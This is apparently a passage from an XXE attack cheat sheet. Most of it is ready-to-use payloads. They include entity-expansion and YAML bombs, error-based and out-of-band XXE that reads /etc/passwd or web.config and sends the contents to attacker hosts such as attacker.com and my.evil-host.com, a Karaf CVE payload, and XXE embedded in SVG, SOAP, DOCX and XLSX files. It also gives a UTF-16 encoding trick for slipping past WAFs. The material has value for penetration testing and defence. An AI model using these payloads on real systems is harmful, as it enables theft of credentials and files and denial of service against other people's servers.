<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="exploiting-xxe-to-perform-a-deny-of-service">Exploiting XXE to perform a deny of service</h2>

<p>:warning: : These attacks might kill the service or the server, do not use them on the production.</p>

<h3 id="billion-laugh-attack">Billion Laugh Attack</h3>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE data [
&lt;!ENTITY a0 "dos" &gt;</span>
<span class="cp">&lt;!ENTITY a1 "&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;"&gt;</span>
<span class="cp">&lt;!ENTITY a2 "&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;"&gt;</span>
<span class="cp">&lt;!ENTITY a3 "&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;"&gt;</span>
<span class="cp">&lt;!ENTITY a4 "&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;"&gt;</span>
]&gt;
<span class="nt">&lt;data&gt;</span><span class="ni">&amp;a4;</span><span class="nt">&lt;/data&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="yaml-attack">Yaml attack</h3>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>a: <span class="err">&amp;</span>a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: <span class="err">&amp;</span>b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: <span class="err">&amp;</span>c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: <span class="err">&amp;</span>d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: <span class="err">&amp;</span>e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: <span class="err">&amp;</span>f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: <span class="err">&amp;</span>g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: <span class="err">&amp;</span>h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: <span class="err">&amp;</span>i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
</pre></td></tr></tbody></table></code></div></div>

<h2 id="error-based-xxe">Error Based XXE</h2>

<p><strong>Payload to trigger the XXE</strong></p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" ?&gt;</span>
<span class="cp">&lt;!DOCTYPE message [
    &lt;!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd"&gt;</span>
    %ext;
]&gt;
<span class="nt">&lt;message&gt;&lt;/message&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Contents of ext.dtd</strong></p>
<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span>
<span class="cp">&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;</span>"&gt;
%eval;
%error;
</pre></td></tr></tbody></table></code></div></div>

<h2 id="exploiting-blind-xxe-to-exfiltrate-data-out-of-band">Exploiting blind XXE to exfiltrate data out-of-band</h2>

<p>Sometimes you won’t have a result outputted in the page but you can still extract the data with an out of band attack.</p>

<h3 id="blind-xxe">Blind XXE</h3>

<p>The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" ?&gt;</span>
<span class="cp">&lt;!DOCTYPE root [
&lt;!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"&gt;</span> %ext;
]&gt;
<span class="nt">&lt;r&gt;&lt;/r&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Send the content of <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to “www.malicious.com”, you may receive only the first line.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;</span>
<span class="cp">&lt;!ENTITY % xxe SYSTEM "file:///etc/passwd" &gt;</span>
<span class="cp">&lt;!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;"&gt;</span>
]
&gt;
<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;callhome;</span><span class="nt">&lt;/foo&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="xxe-oob-attack-yunusov-2013">XXE OOB Attack (Yunusov, 2013)</h3>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="cp">&lt;!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd"&gt;</span>
<span class="nt">&lt;data&gt;</span><span class="ni">&amp;send;</span><span class="nt">&lt;/data&gt;</span>

File stored on http://publicServer.com/parameterEntity_oob.dtd
<span class="cp">&lt;!ENTITY % file SYSTEM "file:///sys/power/image_size"&gt;</span>
<span class="cp">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://publicServer.com/?%file;'&gt;</span>"&gt;
%all;
</pre></td></tr></tbody></table></code></div></div>

<h3 id="xxe-oob-with-dtd-and-php-filter">XXE OOB with DTD and PHP filter</h3>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" ?&gt;</span>
<span class="cp">&lt;!DOCTYPE r [
&lt;!ELEMENT r ANY &gt;</span>
<span class="cp">&lt;!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml"&gt;</span>
%sp;
%param1;
]&gt;
<span class="nt">&lt;r&gt;</span><span class="ni">&amp;exfil;</span><span class="nt">&lt;/r&gt;</span>

File stored on http://127.0.0.1/dtd.xml
<span class="cp">&lt;!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;</span>
<span class="cp">&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'&gt;</span>"&gt;
</pre></td></tr></tbody></table></code></div></div>

<h3 id="xxe-oob-with-apache-karaf">XXE OOB with Apache Karaf</h3>

<p>CVE-2018-11788 affecting versions:</p>

<ul>
  <li>Apache Karaf &lt;= 4.2.1</li>
  <li>Apache Karaf &lt;= 4.1.6</li>
</ul>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="cp">&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"&gt;</span> %dtd;]
<span class="nt">&lt;features</span> <span class="na">name=</span><span class="s">"my-features"</span> <span class="na">xmlns=</span><span class="s">"http://karaf.apache.org/xmlns/features/v1.3.0"</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>
        <span class="na">xsi:schemaLocation=</span><span class="s">"http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;feature</span> <span class="na">name=</span><span class="s">"deployer"</span> <span class="na">version=</span><span class="s">"2.0"</span> <span class="na">install=</span><span class="s">"auto"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/feature&gt;</span>
<span class="nt">&lt;/features&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Send the XML file to the <code class="language-plaintext highlighter-rouge">deploy</code> folder.</p>

<p>Ref. <a href="https://github.com/brianwrf/CVE-2018-11788">brianwrf/CVE-2018-11788</a></p>

<h2 id="xxe-with-local-dtd">XXE with local DTD</h2>

<p>In some case, outgoing connections are not possible from the web application. DNS names might even not resolve externally with a payload like this:</p>
<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'http://h3l9e5soi0090naz81tmq5ztaaaaaa.burpcollaborator.net'&gt;</span>]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;test;</span><span class="nt">&lt;/root&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>If error based exfiltration is possible, you can still rely on a local DTD to do concatenation tricks. Payload to confirm that error message include filename.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE root [
    &lt;!ENTITY % local_dtd SYSTEM "file:///abcxyz/"&gt;</span>

    %local_dtd;
]&gt;
<span class="nt">&lt;root&gt;&lt;/root&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Assuming payloads such as the previous return a verbose error. You can start pointing to local DTD. With an found DTD, you can submit payload such as the following payload. The content of the file will be place in the error message.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE root [
    &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;</span>

    <span class="cp">&lt;!ENTITY % ISOamsa '
        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///REPLACE_WITH_FILENAME_TO_READ"&gt;</span>
        <span class="cp">&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;</span>"&gt;
        <span class="ni">&amp;#x25;</span>eval;
        <span class="ni">&amp;#x25;</span>error;
        '&gt;

    %local_dtd;
]&gt;
<span class="nt">&lt;root&gt;&lt;/root&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md">Other payloads using different DTDs</a></p>

<h2 id="windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents">Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents</h2>

<p>From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79</p>

<h3 id="disclose-local-file">Disclose local file</h3>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE doc [
    &lt;!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd"&gt;</span>
    <span class="cp">&lt;!ENTITY % SuperClass '&gt;</span>
        <span class="cp">&lt;!ENTITY &amp;#x25; file SYSTEM "file://D:\webserv2\services\web.config"&gt;</span>
        <span class="cp">&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file://t/#&amp;#x25;file;&amp;#x27;&gt;</span>"&gt;
        <span class="ni">&amp;#x25;</span>eval;
        <span class="ni">&amp;#x25;</span>error;
      <span class="cp">&lt;!ENTITY test "test"'
    &gt;</span>
    %local_dtd;
  ]&gt;<span class="nt">&lt;xxx&gt;</span>cacat<span class="nt">&lt;/xxx&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="disclose-http-response">Disclose HTTP Response:</h3>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE doc [
    &lt;!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd"&gt;</span>
    <span class="cp">&lt;!ENTITY % SuperClass '&gt;</span>
        <span class="cp">&lt;!ENTITY &amp;#x25; file SYSTEM "https://erp.company.com"&gt;</span>
        <span class="cp">&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file://test/#&amp;#x25;file;&amp;#x27;&gt;</span>"&gt;
        <span class="ni">&amp;#x25;</span>eval;
        <span class="ni">&amp;#x25;</span>error;
      <span class="cp">&lt;!ENTITY test "test"'
    &gt;</span>
    %local_dtd;
  ]&gt;<span class="nt">&lt;xxx&gt;</span>cacat<span class="nt">&lt;/xxx&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="xxe-in-exotic-files">XXE in exotic files</h2>

<h3 id="xxe-inside-svg">XXE inside SVG</h3>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;svg</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2000/svg"</span> <span class="na">xmlns:xlink=</span><span class="s">"http://www.w3.org/1999/xlink"</span> <span class="na">width=</span><span class="s">"300"</span> <span class="na">version=</span><span class="s">"1.1"</span> <span class="na">height=</span><span class="s">"200"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;image</span> <span class="na">xlink:href=</span><span class="s">"expect://ls"</span> <span class="na">width=</span><span class="s">"200"</span> <span class="na">height=</span><span class="s">"200"</span><span class="nt">&gt;&lt;/image&gt;</span>
<span class="nt">&lt;/svg&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Classic</strong></p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" standalone="yes"?&gt;</span>
<span class="cp">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" &gt;</span> ]&gt;
<span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">"128px"</span> <span class="na">height=</span><span class="s">"128px"</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2000/svg"</span> <span class="na">xmlns:xlink=</span><span class="s">"http://www.w3.org/1999/xlink"</span> <span class="na">version=</span><span class="s">"1.1"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;text</span> <span class="na">font-size=</span><span class="s">"16"</span> <span class="na">x=</span><span class="s">"0"</span> <span class="na">y=</span><span class="s">"16"</span><span class="nt">&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/text&gt;</span>
<span class="nt">&lt;/svg&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>OOB via SVG rasterization</strong></p>

<p><em>xxe.svg</em></p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" standalone="yes"?&gt;</span>
<span class="cp">&lt;!DOCTYPE svg [
&lt;!ELEMENT svg ANY &gt;</span>
<span class="cp">&lt;!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml"&gt;</span>
%sp;
%param1;
]&gt;
<span class="nt">&lt;svg</span> <span class="na">viewBox=</span><span class="s">"0 0 200 200"</span> <span class="na">version=</span><span class="s">"1.2"</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2000/svg"</span> <span class="na">style=</span><span class="s">"fill:red"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;text</span> <span class="na">x=</span><span class="s">"15"</span> <span class="na">y=</span><span class="s">"100"</span> <span class="na">style=</span><span class="s">"fill:black"</span><span class="nt">&gt;</span>XXE via SVG rasterization<span class="nt">&lt;/text&gt;</span>
      <span class="nt">&lt;rect</span> <span class="na">x=</span><span class="s">"0"</span> <span class="na">y=</span><span class="s">"0"</span> <span class="na">rx=</span><span class="s">"10"</span> <span class="na">ry=</span><span class="s">"10"</span> <span class="na">width=</span><span class="s">"200"</span> <span class="na">height=</span><span class="s">"200"</span> <span class="na">style=</span><span class="s">"fill:pink;opacity:0.7"</span><span class="nt">/&gt;</span>
      <span class="nt">&lt;flowRoot</span> <span class="na">font-size=</span><span class="s">"15"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;flowRegion&gt;</span>
           <span class="nt">&lt;rect</span> <span class="na">x=</span><span class="s">"0"</span> <span class="na">y=</span><span class="s">"0"</span> <span class="na">width=</span><span class="s">"200"</span> <span class="na">height=</span><span class="s">"200"</span> <span class="na">style=</span><span class="s">"fill:red;opacity:0.3"</span><span class="nt">/&gt;</span>
         <span class="nt">&lt;/flowRegion&gt;</span>
         <span class="nt">&lt;flowDiv&gt;</span>
            <span class="nt">&lt;flowPara&gt;</span><span class="ni">&amp;exfil;</span><span class="nt">&lt;/flowPara&gt;</span>
         <span class="nt">&lt;/flowDiv&gt;</span>
      <span class="nt">&lt;/flowRoot&gt;</span>
<span class="nt">&lt;/svg&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p><em>xxe.xml</em></p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname"&gt;</span>
<span class="cp">&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'&gt;</span>"&gt;
</pre></td></tr></tbody></table></code></div></div>

<h3 id="xxe-inside-soap">XXE inside SOAP</h3>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;soap:Body&gt;</span>
  <span class="nt">&lt;foo&gt;</span>
    <span class="cp">&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;</span>
  <span class="nt">&lt;/foo&gt;</span>
<span class="nt">&lt;/soap:Body&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="xxe-inside-docx-file">XXE inside DOCX file</h3>

<p>Format of an Open XML file (inject the payload in any .xml file):</p>

<ul>
  <li>/_rels/.rels</li>
  <li>[Content_Types].xml</li>
  <li>Default Main Document Part
    <ul>
      <li>/word/document.xml</li>
      <li>/ppt/presentation.xml</li>
      <li>/xl/workbook.xml</li>
    </ul>
  </li>
</ul>

<p>Then update the file <code class="language-plaintext highlighter-rouge">zip -u xxe.docx [Content_Types].xml</code></p>

<p>Tool : https://github.com/BuffaloWill/oxml_xxe</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>DOCX/XLSX/PPTX
ODT/ODG/ODP/ODS
SVG
XML
PDF (experimental)
JPG (experimental)
GIF (experimental)
</pre></td></tr></tbody></table></code></div></div>

<h3 id="xxe-inside-xlsx-file">XXE inside XLSX file</h3>

<p>Extract the excel file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>$ mkdir XXE &amp;&amp; cd XXE
$ unzip ../XXE.xlsx
Archive:  ../XXE.xlsx
  inflating: xl/drawings/drawing1.xml
  inflating: xl/worksheets/sheet1.xml
  inflating: xl/worksheets/_rels/sheet1.xml.rels
  inflating: xl/sharedStrings.xml
  inflating: xl/styles.xml
  inflating: xl/workbook.xml
  inflating: xl/_rels/workbook.xml.rels
  inflating: _rels/.rels
  inflating: [Content_Types].xml
</pre></td></tr></tbody></table></code></div></div>

<p>Add your blind XXE payload inside <code class="language-plaintext highlighter-rouge">xl/workbook.xml</code>.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;xml...&gt;</span>
<span class="cp">&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"&gt;</span> ]&gt;
<span class="nt">&lt;x&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/x&gt;</span>
<span class="nt">&lt;workbook...&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Alternativly, add your payload in <code class="language-plaintext highlighter-rouge">xl/sharedStrings.xml</code>:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ &lt;!ELEMENT t ANY &gt;</span> <span class="cp">&lt;!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"&gt;</span> ]&gt;
<span class="nt">&lt;sst</span> <span class="na">xmlns=</span><span class="s">"http://schemas.openxmlformats.org/spreadsheetml/2006/main"</span> <span class="na">count=</span><span class="s">"10"</span> <span class="na">uniqueCount=</span><span class="s">"10"</span><span class="nt">&gt;&lt;si&gt;&lt;t&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA2<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA3<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA4<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA5<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB1<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB2<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB3<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB4<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB5<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;/sst&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Rebuild the Excel file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>$ zip -r ../poc.xlsx *
updating: [Content_Types].xml (deflated 71%)
updating: _rels/ (stored 0%)
updating: _rels/.rels (deflated 60%)
updating: docProps/ (stored 0%)
updating: docProps/app.xml (deflated 51%)
updating: docProps/core.xml (deflated 50%)
updating: xl/ (stored 0%)
updating: xl/workbook.xml (deflated 56%)
updating: xl/worksheets/ (stored 0%)
updating: xl/worksheets/sheet1.xml (deflated 53%)
updating: xl/styles.xml (deflated 60%)
updating: xl/theme/ (stored 0%)
updating: xl/theme/theme1.xml (deflated 80%)
updating: xl/_rels/ (stored 0%)
updating: xl/_rels/workbook.xml.rels (deflated 66%)
updating: xl/sharedStrings.xml (deflated 17%)
</pre></td></tr></tbody></table></code></div></div>

<h3 id="xxe-inside-dtd-file">XXE inside DTD file</h3>

<p>Most XXE payloads detailed above require control over both the DTD or <code class="language-plaintext highlighter-rouge">DOCTYPE</code> block as well as the <code class="language-plaintext highlighter-rouge">xml</code> file.
In rare situations, you may only control the DTD file and won’t be able to modify the <code class="language-plaintext highlighter-rouge">xml</code> file. For example, a MITM.
When all you control is the DTD file, and you do not control the <code class="language-plaintext highlighter-rouge">xml</code> file, XXE may still be possible with this payload.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="c">&lt;!-- Load the contents of a sensitive file into a variable --&gt;</span>
<span class="cp">&lt;!ENTITY % payload SYSTEM "file:///etc/passwd"&gt;</span>
<span class="c">&lt;!-- Use that variable to construct an HTTP get request with the file contents in the URL --&gt;</span>
<span class="cp">&lt;!ENTITY % param1 '&lt;!ENTITY &amp;#37; external SYSTEM "http://my.evil-host.com/x=%payload;"&gt;</span>'&gt;
%param1;
%external;
</pre></td></tr></tbody></table></code></div></div>

<h3 id="xxe-waf-bypass-via-convert-character-encoding">XXE WAF Bypass via convert character encoding</h3>

<p>In XXE WAFs, DTD Prolog are usually blacklisted BUT not all WAFs blacklist the UTF-16 character encoding<br /><br />
<code class="language-plaintext highlighter-rouge">All XML processors must accept the UTF-8 and UTF-16 encodings of Unicode</code> 
– https://www.w3.org/XML/xml-V10-4e-errata#E11
<br /><br />
we can convert the character encoding to <code class="language-plaintext highlighter-rouge">UTF-16</code> using <a href="https://man7.org/linux/man-pages/man1/iconv.1.html">iconv</a> to bypass the XXE WAF:-<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">cat </span>utf8exploit.xml | iconv <span class="nt">-f</span> UTF-8 <span class="nt">-t</span> UTF-16BE <span class="o">&gt;</span> utf16exploit.xml
</pre></td></tr></tbody></table></code></div></div>

<h2 id="references">References</h2>

<ul>
  <li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing">XML External Entity (XXE) Processing - OWASP</a></li>
  <li><a href="http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html">Detecting and exploiting XXE in SAML Interfaces</a> - 6. Nov. 2014 - Von Christian Mainka</li>
  <li><a href="https://gist.github.com/staaldraad/01415b990939494879b4">[Gist] staaldraad - XXE payloads</a></li>
  <li><a href="https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870">[Gist] mgeeky - XML attacks</a></li>
  <li><a href="https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf">Exploiting xxe in file upload functionality - BLACKHAT WEBCAST - 11/19/15 - Will Vandevanter - @<em>will_is</em></a></li>
  <li><a href="http://en.hackdig.com/08/28075.htm">XXE ALL THE THINGS!!! (including Apple iOS’s Office Viewer)</a></li>
  <li><a href="https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/">From blind XXE to root-level file read access - December 12, 2018 by Pieter Hiele</a></li>
  <li><a href="https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/">How we got read access on Google’s production servers</a> April 11, 2014 by  detectify</li>
  <li><a href="http://nerdint.blogspot.hk/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html">Blind OOB XXE At UBER 26+ Domains Hacked</a> August 05, 2016 by Raghav Bisht</li>
  <li><a href="https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf">OOB XXE through SAML</a> by Sean	Melia @seanmeals</li>
  <li><a href="https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html">XXE in Uber to read local files</a> 01/2017</li>
  <li><a href="https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/">XXE inside SVG</a> JUNE 22, 2016 by YEO QUAN YANG</li>
  <li><a href="https://phonexicum.github.io/infosec/xxe.html">Pentest XXE - @phonexicum</a></li>
  <li><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">Exploiting XXE with local DTD files</a> - 12/12/2018 - Arseniy Sharoglazov</li>
